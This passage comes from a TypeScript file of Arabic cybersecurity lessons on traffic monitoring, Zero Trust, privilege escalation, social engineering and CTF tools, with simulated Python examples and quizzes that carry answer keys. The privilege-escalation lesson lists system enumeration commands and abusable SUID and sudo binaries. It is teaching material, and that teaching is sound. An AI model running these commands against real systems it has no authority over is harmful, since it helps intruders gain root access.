        """
        توليد تقرير حركة المرور (محاكاة)
        """
        print(f"\\n📊 تقرير حركة المرور")
        print("=" * 50)
        
        # بيانات محاكاة
        traffic_data = [
            {"proto": "TCP", "src": "192.168.1.100", "dst": "93.184.216.34", "port": 443, "bytes": 15000},
            {"proto": "TCP", "src": "192.168.1.100", "dst": "142.250.185.78", "port": 443, "bytes": 25000},
            {"proto": "UDP", "src": "192.168.1.100", "dst": "8.8.8.8", "port": 53, "bytes": 500},
            {"proto": "TCP", "src": "192.168.1.100", "dst": "151.101.1.140", "port": 443, "bytes": 8000},
            {"proto": "TCP", "src": "10.0.0.50", "dst": "192.168.1.100", "port": 22, "bytes": 2000},
        ]
        
        print(f"\\n{'البروتوكول':<10} {'المصدر':<18} {'الوجهة':<18} {'المنفذ':<8} {'الحجم'}")
        print("-" * 70)
        
        total_bytes = 0
        for t in traffic_data:
            service = self.get_common_ports(t['port'])
            print(f"{t['proto']:<10} {t['src']:<18} {t['dst']:<18} {service:<8} {t['bytes']} bytes")
            total_bytes += t['bytes']
        
        print("-" * 70)
        print(f"{'الإجمالي:':<56} {total_bytes} bytes")
        
        # تحليل البروتوكولات
        print("\\n📈 توزيع البروتوكولات:")
        proto_count = defaultdict(int)
        for t in traffic_data:
            proto_count[t['proto']] += 1
        
        for proto, count in proto_count.items():
            pct = (count / len(traffic_data)) * 100
            bar = "█" * int(pct / 5)
            print(f"  {proto}: {bar} {pct:.0f}%")
    
    def show_live_traffic(self, duration=5):
        """
        عرض حركة المرور الحية (محاكاة)
        """
        print(f"\\n🔴 مراقبة حركة المرور (محاكاة)")
        print("=" * 50)
        print("اضغط Ctrl+C للإيقاف\\n")
        
        simulated_packets = [
            "TCP 192.168.1.100:52341 → 93.184.216.34:443 [SYN]",
            "TCP 93.184.216.34:443 → 192.168.1.100:52341 [SYN,ACK]",
            "TCP 192.168.1.100:52341 → 93.184.216.34:443 [ACK]",
            "TCP 192.168.1.100:52341 → 93.184.216.34:443 [PSH,ACK] len=517",
            "UDP 192.168.1.100:54321 → 8.8.8.8:53 DNS Query A google.com",
            "UDP 8.8.8.8:53 → 192.168.1.100:54321 DNS Response 142.250.185.78",
        ]
        
        try:
            for i, packet in enumerate(simulated_packets):
                time.sleep(0.5)
                timestamp = time.strftime("%H:%M:%S")
                print(f"[{timestamp}] {packet}")
        except KeyboardInterrupt:
            print("\\n⏹️ تم الإيقاف")


# تشغيل
monitor = NetworkMonitor()
monitor.generate_traffic_report()
# monitor.show_live_traffic()`,
    language: 'python',
    xpReward: 130,
    order: 6,
    quiz: {
      question: 'ما الأداة الأشهر لتحليل حزم الشبكة؟',
      options: ['Nmap', 'Wireshark', 'Netcat', 'Ping'],
      correctAnswer: 1,
      explanation:
        'Wireshark هو المعيار لتحليل الحزم مع واجهة رسومية وفلاتر قوية',
    },
  },
  {
    id: 'cyber-zero-trust',
    courseId: 'cyber-network',
    title: 'Zero Trust Architecture',
    description: 'لا تثق بأحد، تحقق من الجميع',
    content: `
# Zero Trust - انعدام الثقة

## الفكرة الأساسية
**"لا تثق أبداً، تحقق دائماً"**

## النموذج التقليدي ❌
- الشبكة الداخلية = موثوقة
- الخارج = غير موثوق
- Firewall على الحدود فقط

## مشاكل النموذج التقليدي
- الاختراق من الداخل
- المهاجم يتحرك بحرية بعد الدخول
- الأجهزة الشخصية
- العمل عن بُعد

## نموذج Zero Trust ✅
- لا شيء موثوق افتراضياً
- التحقق من كل طلب
- أقل صلاحيات ممكنة
- المراقبة المستمرة

## المبادئ الأساسية

### 1. التحقق الصريح
- تحقق من المستخدم
- تحقق من الجهاز
- تحقق من الموقع
- تحقق من السلوك

### 2. أقل الصلاحيات
- Just-In-Time access
- Just-Enough access
- صلاحيات مؤقتة

### 3. افترض الاختراق
- Segmentation دقيق
- تشفير end-to-end
- تحليل مستمر

## التطبيق العملي

### Identity
- MFA إجباري
- SSO موحد
- إدارة الهوية

### Devices
- MDM (Mobile Device Management)
- فحص صحة الجهاز
- شهادات الأجهزة

### Network
- Micro-segmentation
- تشفير داخلي
- Software-Defined Perimeter

### Applications
- API security
- CASB للـ Cloud
- WAF للويب

### Data
- تصنيف البيانات
- DLP
- تشفير
`,
    codeExample: `# محاكاة مفاهيم Zero Trust
import hashlib
import time
from datetime import datetime
from enum import Enum

class TrustLevel(Enum):
    NONE = 0
    LOW = 1
    MEDIUM = 2
    HIGH = 3

class ZeroTrustDemo:
    """
    محاكاة نظام Zero Trust
    """
    
    def __init__(self):
        self.access_logs = []
        self.risk_thresholds = {
            "max_failed_attempts": 3,
            "session_timeout_minutes": 30,
            "unusual_location_risk": 50,
            "new_device_risk": 30,
        }
    
    def evaluate_identity(self, user_id, mfa_verified, password_strength):
        """
        تقييم الهوية
        """
        score = 0
        factors = []
        
        # التحقق الأساسي
        if user_id:
            score += 20
            factors.append("✅ User ID valid")
        
        # MFA
        if mfa_verified:
            score += 40
            factors.append("✅ MFA verified")
        else:
            factors.append("❌ MFA not verified")
        
        # قوة كلمة المرور
        if password_strength == "strong":
            score += 20
            factors.append("✅ Strong password")
        elif password_strength == "medium":
            score += 10
            factors.append("⚠️ Medium password")
        else:
            factors.append("❌ Weak password")
        
        return {"score": score, "factors": factors}
    
    def evaluate_device(self, device_info):
        """
        تقييم الجهاز
        """
        score = 0
        factors = []
        
        # جهاز معروف
        if device_info.get("known"):
            score += 25
            factors.append("✅ Known device")
        else:
            factors.append("⚠️ New device")
        
        # التحديثات
        if device_info.get("updated"):
            score += 25
            factors.append("✅ Device updated")
        else:
            factors.append("❌ Outdated device")
        
        # مكافح فيروسات
        if device_info.get("antivirus"):
            score += 15
            factors.append("✅ Antivirus active")
        else:
            factors.append("⚠️ No antivirus")
        
        # تشفير القرص
        if device_info.get("encrypted"):
            score += 15
            factors.append("✅ Disk encrypted")
        else:
            factors.append("⚠️ Not encrypted")
        
        return {"score": score, "factors": factors}
    
    def evaluate_context(self, context):
        """
        تقييم السياق
        """
        score = 50  # نبدأ من المنتصف
        factors = []
        risk_increase = 0
        
        # الموقع
        if context.get("location") == "office":
            score += 20
            factors.append("✅ Office location")
        elif context.get("location") == "home":
            score += 10
            factors.append("✅ Home location")
        else:
            risk_increase += self.risk_thresholds["unusual_location_risk"]
            factors.append("⚠️ Unusual location")
        
        # الوقت
        hour = context.get("hour", 12)
        if 8 <= hour <= 18:
            factors.append("✅ Business hours")
        else:
            risk_increase += 20
            factors.append("⚠️ Outside business hours")
        
        # نوع الطلب
        if context.get("request_type") == "read":
            factors.append("✅ Read operation")
        elif context.get("request_type") == "write":
            risk_increase += 10
            factors.append("⚠️ Write operation")
        elif context.get("request_type") == "admin":
            risk_increase += 30
            factors.append("🔴 Admin operation")
        
        score = max(0, score - risk_increase)
        return {"score": score, "factors": factors, "risk": risk_increase}
    
    def make_access_decision(self, identity_score, device_score, context_score, 
                             resource_sensitivity="medium"):
        """
        اتخاذ قرار الوصول
        """
        total_score = identity_score + device_score + context_score
        
        # عتبات حسب حساسية المورد
        thresholds = {
            "low": 100,
            "medium": 150,
            "high": 200,
            "critical": 250
        }
        
        threshold = thresholds.get(resource_sensitivity, 150)
        
        print(f"\\n📊 تقييم Zero Trust")
        print("=" * 50)
        print(f"  Identity Score:  {identity_score}/80")
        print(f"  Device Score:    {device_score}/80")
        print(f"  Context Score:   {context_score}/80")
        print(f"  ─────────────────────────")
        print(f"  Total Score:     {total_score}/240")
        print(f"  Required:        {threshold}")
        print(f"  Resource:        {resource_sensitivity}")
        
        if total_score >= threshold:
            decision = "✅ ACCESS GRANTED"
            trust_level = TrustLevel.HIGH if total_score > threshold + 50 else TrustLevel.MEDIUM
        else:
            decision = "❌ ACCESS DENIED"
            trust_level = TrustLevel.NONE
            
            # اقتراح خطوات إضافية
            print(f"\\n  🔒 للحصول على الوصول:")
            if identity_score < 60:
                print("    - تحقق MFA مطلوب")
            if device_score < 50:
                print("    - تحديث الجهاز أو استخدام جهاز معتمد")
            if context_score < 30:
                print("    - استخدم VPN أو اتصل من موقع معروف")
        
        print(f"\\n  القرار: {decision}")
        print(f"  Trust Level: {trust_level.name}")
        
        return {
            "decision": "granted" if total_score >= threshold else "denied",
            "trust_level": trust_level,
            "score": total_score,
            "threshold": threshold
        }
    
    def simulate_access_request(self, user_id, resource):
        """
        محاكاة طلب وصول كامل
        """
        print(f"\\n{'='*60}")
        print(f"  طلب وصول جديد: {user_id} → {resource}")
        print(f"{'='*60}")
        
        # تقييم الهوية
        print("\\n🔑 تقييم الهوية:")
        identity = self.evaluate_identity(
            user_id=user_id,
            mfa_verified=True,
            password_strength="strong"
        )
        for f in identity['factors']:
            print(f"  {f}")
        
        # تقييم الجهاز
        print("\\n💻 تقييم الجهاز:")
        device = self.evaluate_device({
            "known": True,
            "updated": True,
            "antivirus": True,
            "encrypted": False
        })
        for f in device['factors']:
            print(f"  {f}")
        
        # تقييم السياق
        print("\\n📍 تقييم السياق:")
        context = self.evaluate_context({
            "location": "home",
            "hour": datetime.now().hour,
            "request_type": "read"
        })
        for f in context['factors']:
            print(f"  {f}")
        
        # القرار النهائي
        decision = self.make_access_decision(
            identity['score'],
            device['score'],
            context['score'],
            resource_sensitivity="medium"
        )
        
        return decision


# تشغيل المحاكاة
zt = ZeroTrustDemo()

# محاكاة طلبات مختلفة
zt.simulate_access_request("ahmed@company.com", "Customer Database")`,
    language: 'python',
    xpReward: 160,
    order: 7,
    quiz: {
      question: 'ما المبدأ الأساسي لـ Zero Trust؟',
      options: [
        'ثق بالشبكة الداخلية',
        'لا تثق أبداً، تحقق دائماً',
        'Firewall يكفي للحماية',
        'كلمة المرور كافية',
      ],
      correctAnswer: 1,
      explanation:
        'Zero Trust يفترض أن أي شيء قد يكون مخترقاً، لذا يجب التحقق من كل طلب',
    },
  },
];

// ===== دروس إضافية للاختراق الأخلاقي =====
export const ADVANCED_ETHICAL_HACKING: Lesson[] = [
  {
    id: 'ethical-privilege-escalation',
    courseId: 'cyber-ethical-hacking',
    title: 'رفع الصلاحيات (Privilege Escalation)',
    description: 'كيف يحصل المخترق على صلاحيات أعلى',
    content: `
# رفع الصلاحيات - Privilege Escalation

## ما هو؟
الانتقال من صلاحيات محدودة إلى صلاحيات أعلى (root/admin).

## الأنواع

### Vertical (عمودي)
user → root/admin
الحصول على صلاحيات أعلى

### Horizontal (أفقي)
user1 → user2
الوصول لحساب بنفس المستوى

## Linux Privilege Escalation

### SUID Binaries
\`\`\`bash
# البحث عن ملفات SUID
find / -perm -4000 2>/dev/null

# استغلال نسخة قديمة من sudo
sudo -l
\`\`\`

### Cron Jobs
\`\`\`bash
# فحص cron
cat /etc/crontab
ls -la /etc/cron.*/
\`\`\`

### Writable Files
\`\`\`bash
# ملفات قابلة للكتابة
find / -writable 2>/dev/null
\`\`\`

### Kernel Exploits
\`\`\`bash
# معرفة إصدار النواة
uname -a
\`\`\`

## Windows Privilege Escalation

### Service Misconfigurations
- Unquoted service paths
- Weak service permissions

### Token Impersonation
- SeImpersonatePrivilege
- Potato attacks

### UAC Bypass
- تجاوز User Account Control

### Registry Keys
- AlwaysInstallElevated

## أدوات مساعدة
- **LinPEAS/WinPEAS**: فحص آلي
- **GTFOBins**: قائمة استغلالات Linux
- **LOLBAS**: قائمة Windows
`,
    codeExample: `# أدوات فحص Privilege Escalation
import os
import subprocess
import platform

class PrivEscChecker:
    """
    فحص نقاط ضعف Privilege Escalation
    ⚠️ للاستخدام الأخلاقي فقط!
    """
    
    def __init__(self):
        self.findings = []
        self.os_type = platform.system()
    
    def check_linux_suid(self):
        """
        فحص ملفات SUID في Linux
        """
        print("\\n🔍 فحص ملفات SUID...")
        
        dangerous_suids = [
            '/usr/bin/find', '/usr/bin/vim', '/usr/bin/python',
            '/usr/bin/perl', '/usr/bin/ruby', '/usr/bin/awk',
            '/usr/bin/nmap', '/usr/bin/less', '/usr/bin/more',
            '/usr/bin/nano', '/usr/bin/cp', '/usr/bin/mv',
        ]
        
        # محاكاة نتائج
        found_suids = [
            '/usr/bin/passwd',
            '/usr/bin/sudo',
            '/usr/bin/find',  # هذا خطير!
        ]
        
        print("  ملفات SUID:")
        for suid in found_suids:
            status = "🔴 خطير!" if suid in dangerous_suids else "✅ عادي"
            print(f"    {suid} - {status}")
            
            if suid in dangerous_suids:
                self.findings.append({
                    "type": "SUID",
                    "file": suid,
                    "severity": "HIGH",
                    "note": "يمكن استغلاله لرفع الصلاحيات"
                })
    
    def check_sudo_permissions(self):
        """
        فحص صلاحيات sudo
        """
        print("\\n🔍 فحص صلاحيات sudo...")
        
        # محاكاة نتائج sudo -l
        sudo_permissions = [
            "(ALL) NOPASSWD: /usr/bin/vim",
            "(ALL) /usr/bin/apt-get",
        ]
        
        dangerous_commands = ['vim', 'vi', 'nano', 'less', 'more', 'awk', 
                             'find', 'python', 'perl', 'ruby', 'bash']
        
        for perm in sudo_permissions:
            is_dangerous = any(cmd in perm for cmd in dangerous_commands)
            is_nopasswd = "NOPASSWD" in perm
            
            if is_dangerous and is_nopasswd:
                status = "🔴 خطير جداً!"
                self.findings.append({
                    "type": "SUDO",
                    "permission": perm,
                    "severity": "CRITICAL"
                })
            elif is_dangerous:
                status = "🟡 يحتاج مراجعة"
            else:
                status = "✅"
            
            print(f"    {perm} - {status}")
    
    def check_writable_files(self):
        """
        فحص ملفات مهمة قابلة للكتابة
        """
        print("\\n🔍 فحص ملفات قابلة للكتابة...")
        
        important_files = [
            '/etc/passwd',
            '/etc/shadow',
            '/etc/sudoers',
            '/etc/crontab',
        ]
        
        # محاكاة
        writable = ['/etc/crontab']
        
        for f in important_files:
            if f in writable:
                print(f"    🔴 {f} - قابل للكتابة!")
                self.findings.append({
                    "type": "WRITABLE_FILE",
                    "file": f,
                    "severity": "CRITICAL"
                })
            else:
                print(f"    ✅ {f} - محمي")
    
    def check_cron_jobs(self):
        """
        فحص Cron Jobs
        """
        print("\\n🔍 فحص Cron Jobs...")
        
        # محاكاة cron jobs
        cron_jobs = [
            {"schedule": "*/5 * * * *", "user": "root", "command": "/opt/backup.sh"},
            {"schedule": "0 0 * * *", "user": "www-data", "command": "/var/www/cleanup.py"},
        ]
        
        for job in cron_jobs:
            print(f"    [{job['user']}] {job['schedule']} {job['command']}")
            
            # فحص إذا كان الملف قابل للكتابة (محاكاة)
            if job['command'] == "/opt/backup.sh":
                print(f"      🔴 الملف قابل للكتابة ويعمل بصلاحيات {job['user']}!")
                self.findings.append({
                    "type": "CRON",
                    "job": job,
                    "severity": "HIGH"
                })
    
    def check_kernel_version(self):
        """
        فحص إصدار النواة
        """
        print("\\n🔍 فحص إصدار النواة...")
        
        # محاكاة
        kernel = "Linux 4.15.0-generic"
        print(f"    النواة: {kernel}")
        
        # قائمة إصدارات معرضة (مبسطة)
        vulnerable_kernels = ["4.15.0", "3.13.0", "2.6.32"]
        
        for vk in vulnerable_kernels:
            if vk in kernel:
                print(f"    🔴 إصدار قديم! قد يكون معرض لثغرات")
                self.findings.append({
                    "type": "KERNEL",
                    "version": kernel,
                    "severity": "HIGH"
                })
                break
        else:
            print(f"    ✅ الإصدار حديث نسبياً")
    
    def generate_report(self):
        """
        توليد تقرير
        """
        print("\\n" + "=" * 60)
        print("  📋 تقرير فحص Privilege Escalation")
        print("=" * 60)
        
        if not self.findings:
            print("  ✅ لم يُعثر على نقاط ضعف واضحة")
            return
        
        severity_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3}
        sorted_findings = sorted(self.findings, key=lambda x: severity_order.get(x['severity'], 4))
        
        for finding in sorted_findings:
            emoji = "🔴" if finding['severity'] == "CRITICAL" else "🟡" if finding['severity'] == "HIGH" else "🟢"
            print(f"\\n  {emoji} [{finding['severity']}] {finding['type']}")
            for key, value in finding.items():
                if key not in ['type', 'severity']:
                    print(f"      {key}: {value}")
    
    def run_all_checks(self):
        """
        تشغيل كل الفحوصات
        """
        print("\\n🔒 فحص Privilege Escalation")
        print("=" * 60)
        
        self.check_linux_suid()
        self.check_sudo_permissions()
        self.check_writable_files()
        self.check_cron_jobs()
        self.check_kernel_version()
        
        self.generate_report()


# تشغيل
checker = PrivEscChecker()
checker.run_all_checks()`,
    language: 'python',
    xpReward: 180,
    order: 8,
    quiz: {
      question: 'ما هو SUID في Linux؟',
      options: [
        'نوع من الفيروسات',
        'صلاحية تجعل البرنامج يعمل بصلاحيات مالكه',
        'أداة فحص',
        'بروتوكول شبكة',
      ],
      correctAnswer: 1,
      explanation:
        'SUID (Set User ID) يجعل البرنامج يعمل بصلاحيات مالكه (غالباً root)، مما قد يُستغل لرفع الصلاحيات',
    },
  },
  {
    id: 'ethical-social-engineering',
    courseId: 'cyber-ethical-hacking',
    title: 'الهندسة الاجتماعية',
    description: 'فن اختراق العقول',
    content: `
# الهندسة الاجتماعية - Social Engineering

## ما هي؟
استغلال الثقة البشرية للحصول على معلومات أو وصول.

## لماذا تنجح؟
- البشر الحلقة الأضعف
- الثقة الفطرية
- الرغبة في المساعدة
- الخوف من السلطة

## أنواع الهجمات

### 1. Phishing
رسائل مزيفة تبدو حقيقية

### 2. Pretexting
انتحال شخصية (IT support مثلاً)

### 3. Baiting
ترك USB مصاب في موقف السيارات

### 4. Quid Pro Quo
"سأصلح كمبيوترك مقابل كلمة مرورك"

### 5. Tailgating
الدخول خلف موظف مصرّح

### 6. Vishing
التصيد عبر الهاتف

## تقنيات التأثير (Cialdini)

### 1. Authority (السلطة)
"أنا من قسم IT..."

### 2. Urgency (الاستعجال)
"يجب أن تفعل هذا الآن!"

### 3. Social Proof (الدليل الاجتماعي)
"كل زملائك فعلوا هذا"

### 4. Liking (المحبة)
بناء علاقة ودية أولاً

### 5. Reciprocity (المعاملة بالمثل)
"ساعدتك، الآن ساعدني"

### 6. Scarcity (الندرة)
"هذا العرض لفترة محدودة"

## الحماية
- التدريب والتوعية
- التحقق من الهوية
- سياسات واضحة
- ثقافة "من الآمن أن تسأل"
`,
    codeExample: `# تحليل هجمات الهندسة الاجتماعية
class SocialEngineeringAnalyzer:
    """
    تحليل رسائل الهندسة الاجتماعية
    """
    
    def __init__(self):
        self.indicators = {
            "urgency": [
                "فوراً", "الآن", "عاجل", "خلال 24 ساعة",
                "immediately", "urgent", "asap", "now"
            ],
            "authority": [
                "المدير", "IT", "الإدارة", "البنك", "الشرطة",
                "CEO", "manager", "support", "admin"
            ],
            "fear": [
                "حسابك معرض", "تم اختراق", "سيتم إغلاق",
                "suspended", "hacked", "compromised", "locked"
            ],
            "reward": [
                "فزت", "مجاناً", "هدية", "جائزة",
                "won", "free", "gift", "prize", "congratulations"
            ],
            "action": [
                "انقر هنا", "تحقق الآن", "أدخل بياناتك",
                "click here", "verify now", "confirm", "update"
            ]
        }
    
    def analyze_message(self, message):
        """
        تحليل رسالة للكشف عن تقنيات SE
        """
        message_lower = message.lower()
        
        findings = {
            "risk_score": 0,
            "techniques_found": [],
            "suspicious_elements": []
        }
        
        # فحص كل مؤشر
        for technique, keywords in self.indicators.items():
            for keyword in keywords:
                if keyword.lower() in message_lower:
                    findings["techniques_found"].append(technique)
                    findings["suspicious_elements"].append(keyword)
                    findings["risk_score"] += 20
                    break
        
        # تقييم إضافي
        
        # روابط
        if "http" in message_lower or "click" in message_lower:
            findings["risk_score"] += 15
            findings["suspicious_elements"].append("رابط محتمل")
        
        # طلب معلومات حساسة
        sensitive_words = ["password", "كلمة مرور", "رقم البطاقة", "ssn", "pin"]
        for word in sensitive_words:
            if word in message_lower:
                findings["risk_score"] += 30
                findings["suspicious_elements"].append(f"طلب: {word}")
        
        # التقييم النهائي
        if findings["risk_score"] >= 70:
            findings["verdict"] = "🔴 خطر عالي - احتمال تصيد!"
        elif findings["risk_score"] >= 40:
            findings["verdict"] = "🟡 مشبوه - تحقق قبل التفاعل"
        else:
            findings["verdict"] = "🟢 يبدو عادياً - لكن ابقَ حذراً"
        
        return findings
    
    def print_analysis(self, message):
        """
        عرض التحليل
        """
        print("\\n" + "=" * 60)
        print("  🔍 تحليل رسالة الهندسة الاجتماعية")
        print("=" * 60)
        print(f"\\n  الرسالة:\\n  {message[:100]}...")
        
        analysis = self.analyze_message(message)
        
        print(f"\\n  📊 النتيجة: {analysis['verdict']}")
        print(f"  درجة الخطورة: {analysis['risk_score']}")
        
        if analysis['techniques_found']:
            print(f"\\n  🎯 التقنيات المكتشفة:")
            for tech in set(analysis['techniques_found']):
                print(f"    - {tech}")
        
        if analysis['suspicious_elements']:
            print(f"\\n  ⚠️ العناصر المشبوهة:")
            for elem in set(analysis['suspicious_elements']):
                print(f"    - {elem}")
    
    def generate_awareness_tips(self):
        """
        نصائح توعوية
        """
        tips = """
╔══════════════════════════════════════════════╗
║     نصائح الحماية من الهندسة الاجتماعية     ║
╚══════════════════════════════════════════════╝

📧 عند استلام رسالة مشبوهة:
  ✓ تحقق من عنوان المرسل بدقة
  ✓ لا تنقر على روابط مباشرة
  ✓ اتصل بالجهة عبر رقمها الرسمي
  ✓ لا تشارك كلمات المرور أبداً

📞 عند تلقي مكالمة مشبوهة:
  ✓ اطلب رقم للاتصال بهم لاحقاً
  ✓ تحقق من هوية المتصل
  ✓ لا تعطِ معلومات تحت الضغط
  ✓ أغلق واتصل بالجهة مباشرة

👤 في الموقع الفعلي:
  ✓ لا تدخل أحداً خلفك
  ✓ تحقق من بطاقات الهوية
  ✓ أبلغ عن الغرباء
  ✓ لا تترك جهازك مفتوحاً

💡 القاعدة الذهبية:
  "إذا بدا الأمر غريباً، فهو غالباً كذلك"
  "من الآمن دائماً أن تسأل وتتحقق"
"""
        return tips


# أمثلة
analyzer = SocialEngineeringAnalyzer()

# رسائل للاختبار
messages = [
    "عزيزي العميل، تم رصد نشاط مشبوه في حسابك. يرجى النقر هنا فوراً لتأكيد هويتك وإدخال كلمة المرور لتجنب إغلاق الحساب.",
    "مبروك! لقد فزت بجائزة 1000$ من شركتنا. أرسل رقم بطاقتك الآن للحصول على الجائزة مجاناً!",
    "مرحباً، هذه رسالة تذكير بموعدك غداً الساعة 3 مساءً.",
]

for msg in messages:
    analyzer.print_analysis(msg)

print(analyzer.generate_awareness_tips())`,
    language: 'python',
    xpReward: 150,
    order: 9,
    quiz: {
      question: 'ما أكثر تقنيات الهندسة الاجتماعية فعالية؟',
      options: [
        'إرسال فيروسات',
        'استغلال الاستعجال والخوف',
        'اختراق الفايروول',
        'فحص المنافذ',
      ],
      correctAnswer: 1,
      explanation:
        'الاستعجال والخوف يدفعان الناس للتصرف دون تفكير، وهذا ما يستغله المهاجمون',
    },
  },
  {
    id: 'ethical-ctf',
    courseId: 'cyber-ethical-hacking',
    title: 'CTF - تحديات الاختراق',
    description: 'تعلم من خلال التحديات',
    content: `
# CTF - Capture The Flag

## ما هو CTF؟
مسابقات أمنية لحل تحديات واستخراج "flags".

## أنواع CTF

### Jeopardy Style
- فئات متعددة
- كل تحدٍ له نقاط
- حل = flag = نقاط

### Attack-Defense
- فريقان أو أكثر
- دافع واهجم في نفس الوقت
- أصعب وأكثر واقعية

### King of the Hill
- السيطرة على خادم
- البقاء مسيطراً أطول وقت

## فئات التحديات

### Web
- SQL Injection
- XSS
- Authentication bypass
- SSRF

### Crypto
- فك تشفير
- كسر خوارزميات
- تحليل تشفيري

### Pwn (Binary Exploitation)
- Buffer overflow
- Format string
- ROP chains

### Reverse Engineering
- تحليل برامج
- فهم كود بدون مصدر
- كسر حماية

### Forensics
- تحليل ملفات
- استرجاع بيانات
- تحليل ذاكرة

### Misc
- متنوعة
- تفكير خارج الصندوق

## منصات CTF

### للمبتدئين
- **PicoCTF**: الأفضل للبداية
- **TryHackMe**: مسارات تعليمية
- **HackTheBox Starting Point**: تحديات سهلة

### للمتوسطين
- **HackTheBox**: آلات وتحديات
- **VulnHub**: آلات محلية
- **PortSwigger**: ثغرات الويب

### للمتقدمين
- **CTFtime**: مسابقات عالمية
- **Pwnable.kr/tw**: Binary exploitation
- **Root-Me**: تنوع كبير
`,
    codeExample: `# أدوات CTF الأساسية
import base64
import binascii
import hashlib
from itertools import cycle

class CTFToolkit:
    """
    أدوات أساسية لحل تحديات CTF
    """
    
    # ===== Encoding/Decoding =====
    
    @staticmethod
    def base64_decode(encoded):
        """فك Base64"""
        try:
            return base64.b64decode(encoded).decode()
        except:
            return base64.b64decode(encoded)
    
    @staticmethod
    def base64_encode(data):
        """ترميز Base64"""
        if isinstance(data, str):
            data = data.encode()
        return base64.b64encode(data).decode()
    
    @staticmethod
    def hex_to_ascii(hex_string):
        """تحويل Hex لنص"""
        hex_string = hex_string.replace(" ", "").replace("0x", "")
        return binascii.unhexlify(hex_string).decode()
    
    @staticmethod
    def ascii_to_hex(text):
        """تحويل نص لـ Hex"""
        return binascii.hexlify(text.encode()).decode()
    
    @staticmethod
    def binary_to_ascii(binary):
        """تحويل Binary لنص"""
        binary = binary.replace(" ", "")
        return ''.join(chr(int(binary[i:i+8], 2)) for i in range(0, len(binary), 8))
    
    # ===== Crypto =====
    
    @staticmethod
    def caesar_decrypt(ciphertext, shift=None):
        """فك Caesar cipher"""
        results = []
        
        shifts = [shift] if shift else range(26)
        
        for s in shifts:
            decrypted = ""
            for char in ciphertext:
                if char.isalpha():
                    ascii_offset = ord('A') if char.isupper() else ord('a')
                    decrypted += chr((ord(char) - ascii_offset - s) % 26 + ascii_offset)
                else:
                    decrypted += char
            results.append((s, decrypted))
        
        return results
    
    @staticmethod
    def xor_decrypt(ciphertext, key):
        """فك XOR"""
        if isinstance(ciphertext, str):
            ciphertext = ciphertext.encode()
        if isinstance(key, str):
            key = key.encode()
        
        return bytes([c ^ k for c, k in zip(ciphertext, cycle(key))])
    
    @staticmethod
    def rot13(text):
        """ROT13"""
        result = ""
        for char in text:
            if char.isalpha():
                ascii_offset = ord('A') if char.isupper() else ord('a')
                result += chr((ord(char) - ascii_offset + 13) % 26 + ascii_offset)
            else:
                result += char
        return result
    
    # ===== Hashing =====
    
    @staticmethod
    def hash_identify(hash_value):
        """تحديد نوع الهاش"""
        length = len(hash_value)
        
        hash_types = {
            32: ["MD5", "NTLM"],
            40: ["SHA-1"],
            64: ["SHA-256"],
            128: ["SHA-512"],
        }
        
        return hash_types.get(length, ["Unknown"])
    
    @staticmethod
    def hash_text(text, algorithm='md5'):
        """حساب هاش"""
        algorithms = {
            'md5': hashlib.md5,
            'sha1': hashlib.sha1,
            'sha256': hashlib.sha256,
            'sha512': hashlib.sha512,
        }
        
        hasher = algorithms.get(algorithm, hashlib.md5)
        return hasher(text.encode()).hexdigest()
    
    # ===== String Analysis =====
    
    @staticmethod
    def find_flag(text, pattern="flag{"):
        """البحث عن flag"""
        import re
        patterns = [
            r'flag\\{[^}]+\\}',
            r'FLAG\\{[^}]+\\}',
            r'ctf\\{[^}]+\\}',
            r'CTF\\{[^}]+\\}',
            r'picoCTF\\{[^}]+\\}',
        ]
        
        for p in patterns:
            matches = re.findall(p, text, re.IGNORECASE)
            if matches:
                return matches
        return None
    
    @staticmethod
    def extract_strings(data, min_length=4):
        """استخراج النصوص من بيانات"""
        import re
        strings = re.findall(b'[\\x20-\\x7e]{%d,}' % min_length, data)
        return [s.decode() for s in strings]


# ===== أمثلة على حل تحديات =====
toolkit = CTFToolkit()

print("🎯 CTF Toolkit Demo")
print("=" * 50)

# Base64
print("\\n📝 Base64:")
encoded = "ZmxhZ3t0aGlzX2lzX2FfZmxhZ30="
print(f"  Encoded: {encoded}")
print(f"  Decoded: {toolkit.base64_decode(encoded)}")

# Hex
print("\\n📝 Hex:")
hex_str = "666c61677b6865785f69735f66756e7d"
print(f"  Hex: {hex_str}")
print(f"  ASCII: {toolkit.hex_to_ascii(hex_str)}")

# Caesar
print("\\n📝 Caesar Cipher:")
cipher = "msj{fljxfw_nx_jfxd}"
print(f"  Cipher: {cipher}")
results = toolkit.caesar_decrypt(cipher)
for shift, plain in results[:5]:
    if "flag" in plain.lower():
        print(f"  ✅ Shift {shift}: {plain}")
        break

# ROT13
print("\\n📝 ROT13:")
rot = "synt{ebg13_vf_fvzcyr}"
print(f"  ROT13: {rot}")
print(f"  Plain: {toolkit.rot13(rot)}")

# Hash identification
print("\\n📝 Hash Identification:")
hashes = [
    "5d41402abc4b2a76b9719d911017c592",
    "2fd4e1c67a2d28fced849ee1bb76e7391b93eb12",
    "9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08",
]
for h in hashes:
    print(f"  {h[:20]}... → {toolkit.hash_identify(h)}")

# Finding flags
print("\\n📝 Flag Extraction:")
text = "The answer is hidden here: flag{y0u_f0und_m3} somewhere in this text."
flags = toolkit.find_flag(text)
print(f"  Found: {flags}")`,
    language: 'python',
    xpReward: 160,
    order: 10,
    quiz: {
      question: 'ما أفضل منصة CTF للمبتدئين؟',
      options: ['CTFtime', 'Pwnable.kr', 'PicoCTF', 'Root-Me'],
      correctAnswer: 2,
      explanation:
        'PicoCTF مصمم للمبتدئين مع شرح وتلميحات، ومستويات تتدرج من السهل للصعب',
    },
  },
  {
    id: 'ethical-career-path',
    courseId: 'cyber-ethical-hacking',
    title: 'مسار التعلم والشهادات',
    description: 'كيف تبني مسيرتك في الأمن السيبراني',
    content: `
# مسار التعلم والشهادات

## خارطة الطريق

### المرحلة 1: الأساسيات (3-6 أشهر)
- أساسيات الشبكات (TCP/IP, OSI)
- أساسيات Linux
- أساسيات البرمجة (Python)
- أساسيات الأمن (CIA, المصطلحات)

### المرحلة 2: التخصص المبدئي (6-12 شهر)
- اختر مساراً (Web, Network, Cloud...)
- تدرب على CTF
- احصل على شهادة مبتدئين

### المرحلة 3: الخبرة العملية (1-2 سنة)
- وظيفة أو تدريب
- مشاريع شخصية
- Bug Bounty
- شهادة متقدمة

### المرحلة 4: التخصص العميق (2+ سنة)
- Red Team أو Blue Team
